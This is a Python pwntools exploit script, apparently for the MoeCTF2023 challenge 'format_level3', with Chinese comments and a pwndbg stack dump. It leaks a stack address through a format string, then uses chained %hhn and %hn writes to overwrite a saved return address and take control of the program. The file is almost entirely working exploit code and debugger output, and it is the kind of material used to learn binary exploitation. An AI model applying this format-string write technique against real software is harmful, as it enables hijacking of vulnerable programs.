"""MoeCTF2023
.bss:0804C01C 输入参数在bss段，不在栈上，需要想办法输出栈上地址再计算, 第6个是栈上地址

00:0000│ esp 0xff8199b0 —▸ 0x804c01c (str) ◂— '%236p%6$hhn\n'
01:0004│     0xff8199b4 —▸ 0x804c01c (str) ◂— '%236p%6$hhn\n'
02:0008│     0xff8199b8 ◂— 0x10
03:000c│     0xff8199bc —▸ 0x804963e (talk+16) ◂— add ebx, 0x297a
04:0010│     0xff8199c0 —▸ 0x804a231 ◂— 0x47006425 /* '%d' */
05:0014│     0xff8199c4 —▸ 0x804bfb8 (_GLOBAL_OFFSET_TABL...
06:0018│ ebp 0xff8199c8 —▸ 0xff8199e8 —▸ 0xff8199f8 ◂— 0x0               # 1.修改这里低为 0xff8199f8 的 f8 为 ec 指向返回值,
07:001c│     0xff8199cc —▸ 0x8049737 (game+121) ◂— jmp 0x804975a
08:0020│  0xff8199d0 —▸ 0xf7ec0d00 (_IO_2_1_stderr_) ◂— 0xfbad2087
09:0024│  0xff8199d4 ◂— 0x0
0a:0028│  0xff8199d8 ◂— 0x3
0b:002c│  0xff8199dc ◂— 0x7a2c6900
0c:0030│  0xff8199e0 —▸ 0xff819a10 —▸ 0xf7ebfff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21dd8c
0d:0034│  0xff8199e4 —▸ 0xf7ebfff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21dd8c
0e:0038│  0xff8199e8 —▸ 0xff8199f8 ◂— 0x0
0f:003c│  0xff8199ec —▸ 0x8049784 (main+30) ◂— mov eax, 0

--
0e:0038│  0xff8199e8 —▸ 0xff8199ec —▸ 0x8049784 (main+30) ◂— mov eax, 0   # 2. 这里指向了返回值，即可用printf修改
0f:003c│  0xff8199ec —▸ 0x8049784 (main+30) ◂— mov eax, 0
"""
from pwn import *

context.log_level = "debug"
# context.arch = "amd64"
# p = remote('10.52.13.156', 54645)
p = process('./format_level3')
gdb.attach(p, 'b*0x0804969E\nc')

p.sendlineafter(":", b"3")
p.sendlineafter(":", b"%6$p")
p.recvuntil("0x")
stack = int(p.recvline()[:-1], 16)
success('stack: ' + hex(stack))
func_ret = stack + 4
success('func_ret: ' + hex(func_ret))

p.sendlineafter(":", b"3")
payload = "%{}p%6$hhn".format(func_ret & 0xff)  # 修改为
p.sendlineafter(":", payload.encode())
# pause()
p.sendlineafter(":", b"3")
payload = "%{}p%14$hn".format(0x9317)
p.sendlineafter(":", payload.encode())
p.sendlineafter(":", b"4")
p.interactive()
